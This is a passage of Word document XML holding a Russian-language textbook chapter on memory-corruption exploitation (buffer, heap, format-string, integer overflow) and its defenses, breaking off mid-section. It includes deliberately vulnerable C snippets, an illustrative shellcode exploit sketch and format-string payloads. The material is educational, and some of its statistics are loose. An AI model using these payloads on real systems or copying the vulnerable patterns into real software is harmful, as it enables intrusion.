      </w:r>
      <w:r>
        <w:t xml:space="preserve"> помогает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Писать безопасный код** (избегать buffer overflow, race condition, IDOR)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Проводить пентест** (искать уязвимости до того, как их найдут хакеры)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Понимать CVE** (почему Heartbleed позволял читать чужую память)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Оценивать риски** (насколько критична уязвимость, можно ли её эксплуатировать)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статистика</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**70%** критических уязвимостей — это **memory corruption** (переполнение буфера, use-after-free)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**0-day эксплойт** для iOS стоит **$1-2 млн** на чёрном рынке (Zerodium, 2023)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Heartbleed** (2014) затронул **17%** всех HTTPS-серверов в интернете (~500,000 серверов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Spectre/Meltdown** (2018) затронули **все процессоры Intel/AMD** с 1995 года</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В этой главе разберём</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Эксплуатация уязвимостей памяти** (Buffer Overflow, Heap Overflow, Format String, Integer Overflow)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Эксплуатация логики приложений** (Race Condition, IDOR, Path Traversal, Command Injection, XXE, SSRF)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Криптографические атаки** (Padding Oracle, Timing Attack, Replay Attack, Downgrade Attack)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Повышение привилегий** (Horizontal/Vertical Privilege Escalation)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Backdoor и Rootkit** (как хакеры оставляют себе доступ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сетевые атаки (детали)** (TCP SYN Flood, Slowloris, BGP Hijacking)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Аппаратные уязвимости** (Meltdown/Spectre, Rowhammer, Heartbleed, Shellshock)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.6.1. Эксплуатация уязвимостей памяти: Как превратить программу в пушку</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Buffer Overflow (Переполнение буфера)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Запись данных </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>за границы выделенного буфера</w:t>
      </w:r>
      <w:r>
        <w:t>, что позволяет перезаписать соседние данные в памяти (адрес возврата, другие переменные).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как это работает?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Представь, что программа выделила массив на 10 байт в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>стеке</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>#include &lt;string.h&gt;</w:t>
        <w:br/>
        <w:t>void vulnerable_function(char *input) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    char buffer[10];  // Выделили 10 байт</w:t>
        <w:br/>
        <w:t xml:space="preserve">    strcpy(buffer, input);  // УЯЗВИМОСТЬ: нет проверки длины!</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>int main() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    vulnerable_function("AAAAAAAAAAAAAAAAAAAAAAAAAAAA");  // 28 байт</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return 0;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что происходит в памяти</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (стек растёт вниз):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌──────────────────┐ ← High memory (старший адрес)</w:t>
        <w:br/>
        <w:t>│  Return Address  │ ← Адрес возврата после функции</w:t>
        <w:br/>
        <w:t>├──────────────────┤</w:t>
        <w:br/>
        <w:t>│  Saved EBP       │ ← Сохранённый указатель фрейма</w:t>
        <w:br/>
        <w:t>├──────────────────┤</w:t>
        <w:br/>
        <w:t>│  buffer[9]       │</w:t>
        <w:br/>
        <w:t>│  buffer[8]       │</w:t>
        <w:br/>
        <w:t>│  ...             │</w:t>
        <w:br/>
        <w:t>│  buffer[1]       │</w:t>
        <w:br/>
        <w:t>│  buffer[0]       │ ← buffer начинается здесь (10 байт)</w:t>
        <w:br/>
        <w:t>└──────────────────┘ ← Low memory (младший адрес)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>При вводе 28 байт "A"</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌──────────────────┐</w:t>
        <w:br/>
        <w:t>│  0x41414141      │ ← Return Address перезаписан на AAAA (0x41 = 'A')</w:t>
        <w:br/>
        <w:t>├──────────────────┤</w:t>
        <w:br/>
        <w:t>│  0x41414141      │ ← Saved EBP тоже перезаписан</w:t>
        <w:br/>
        <w:t>├──────────────────┤</w:t>
        <w:br/>
        <w:t>│  AAAAAAAAAA      │ ← buffer[0..9]</w:t>
        <w:br/>
        <w:t>└──────────────────┘</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Программа попытается вернуться по адресу `0x41414141` → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Segmentation Fault</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (крах программы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как хакер использует это?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вместо "AAAA..." хакер подставляет:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**NOP sled** (последовательность инструкций NOP = "ничего не делать")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Shellcode** (машинный код, который запускает `/bin/sh` — командную оболочку)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Адрес возврата** → указывает на shellcode</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример эксплойта</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Переполнение буфера для запуска шелла</w:t>
        <w:br/>
        <w:t>payload = b"\x90" * 100  # NOP sled (инструкция 0x90 = NOP)</w:t>
        <w:br/>
        <w:t>payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68..."  # Shellcode (запуск /bin/sh)</w:t>
        <w:br/>
        <w:t>payload += b"\xef\xbe\xad\xde"  # Адрес возврата → на NOP sled</w:t>
        <w:br/>
        <w:br/>
        <w:t># Отправляем payload в уязвимую программу</w:t>
        <w:br/>
        <w:t>os.system(f"./vulnerable_program '{payload.decode('latin1')}'")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Morris Worm (1988)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Первый интернет-червь использовал buffer overflow в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>fingerd</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (UNIX-демон):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отправлял 536-байтовую строку в буфер на 512 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Перезаписывал Return Address → запускал `/bin/sh`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заразил **6,000 компьютеров** (10% интернета того времени)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ущерб: **$10-100 млн**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита от Buffer Overflow</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ASLR (Address Space Layout Randomization)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рандомизация адресов стека/кучи/библиотек при каждом запуске</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер не знает, куда писать адрес возврата</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Включено по умолчанию в Linux/Windows/macOS с ~2007 года</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**DEP/NX bit (Data Execution Prevention / No-eXecute)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Запрет выполнения кода из стека/кучи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Shellcode в стеке не запустится → программа упадёт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Включено по умолчанию в современных ОС</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Stack Canary** (канарейка в стеке):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компилятор вставляет **случайное значение** между buffer и Return Address</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Перед возвратом из функции проверяется canary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если canary изменён → программа завершается с ошибкой</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Флаг GCC: `-fstack-protector`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```c</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   void function() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       char buffer[10];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       long canary = RANDOM_VALUE;  // Компилятор добавляет автоматически</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       strcpy(buffer, input);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       if (canary != RANDOM_VALUE) abort();  // Обнаружили переполнение!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Безопасные функции**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`strcpy()` → `strncpy()` (с ограничением длины)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`gets()` → `fgets()`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`sprintf()` → `snprintf()`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Heap Overflow (Переполнение кучи)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Отличие от Stack Overflow</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Переполнение в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>динамически выделенной памяти</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (malloc/new).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему опасно?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Куча содержит метаданные менеджера памяти (указатели на следующий/предыдущий блок, размер блока). Перезаписав метаданные, можно:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Изменить указатели → записать данные по произвольному адресу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вызвать use-after-free (обращение к уже освобождённой памяти)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример уязвимого кода</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>char *buf1 = malloc(100);</w:t>
        <w:br/>
        <w:t>char *buf2 = malloc(100);</w:t>
        <w:br/>
        <w:br/>
        <w:t>strcpy(buf1, user_input);  // УЯЗВИМОСТЬ: input может быть &gt; 100 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Если `user_input` длиннее 100 байт, он перезапишет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>метаданные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> блока `buf2`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — WhatsApp RCE (2019)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Heap overflow в библиотеке обработки GIF позволял:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отправить специальный GIF в WhatsApp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Переполнить heap → выполнить произвольный код</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Заразить телефон без клика** (zero-click exploit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уязвимость затронула **1.5 миллиарда пользователей**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Heap ASLR** (рандомизация адресов кучи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Heap canaries** (проверка целостности метаданных)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**AddressSanitizer** (ASan) — инструмент для обнаружения ошибок памяти (флаг GCC: `-fsanitize=address`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Format String Vulnerability (Уязвимость форматной строки)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Передача </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пользовательского ввода</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> как format string в `printf()`, `sprintf()`, `scanf()`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уязвимый код</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>char user_input[100];</w:t>
        <w:br/>
        <w:t>scanf("%s", user_input);</w:t>
        <w:br/>
        <w:t>printf(user_input);  // ОПАСНО! Должно быть: printf("%s", user_input);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как это эксплуатируется?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пользователь вводит: `"%x %x %x %x"`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: `printf` читает значения </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>из стека</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и выводит их в hex:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Вывод: 0x7fff5fbff890 0x7fff5fbff8a0 0x00000000 0x41414141</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Хакер может:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Читать память** (утечка данных): `%x %x %x %x %x %x %x %x`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Писать в память**: `%n` — записывает количество выведенных символов по адресу из стека</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример записи в память</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>// Уязвимая программа:</w:t>
        <w:br/>
        <w:t>int secret = 0;</w:t>
        <w:br/>
        <w:t>printf(user_input);</w:t>
        <w:br/>
        <w:t>printf("Secret = %d\n", secret);</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Хакер вводит:</w:t>
        <w:br/>
        <w:t>// AAAA%x%x%x%n</w:t>
        <w:br/>
        <w:t>//</w:t>
        <w:br/>
        <w:t>// Результат:</w:t>
        <w:br/>
        <w:t>// - AAAA (4 символа) выводятся</w:t>
        <w:br/>
        <w:t>// - %x%x%x читают стек</w:t>
        <w:br/>
        <w:t>// - %n записывает число выведенных символов (4 + длина %x) → в адрес 0x41414141 (AAAA)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — CVE-2000-0844 (WU-FTPD)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Format string в FTP-сервере позволял:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отправить команду: `SITE EXEC %x%x%x%x%n`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Перезаписать адрес возврата → выполнить shellcode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Получить root-доступ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ВСЕГДА** используй: `printf("%s", user_input)` вместо `printf(user_input)`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компилятор предупреждает: `-Wformat -Wformat-security`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Integer Overflow (Переполнение целых чисел)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Переполнение типа данных (например, `int`, `short`), что приводит к </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>неожиданному поведению</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>unsigned char x = 255;  // 8-битное число (max = 255)</w:t>
        <w:br/>
        <w:t>x = x + 1;  // Переполнение: 256 → 0 (по модулю 256)</w:t>
        <w:br/>
        <w:t>printf("%d", x);  // Вывод: 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как это эксплуатируется?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
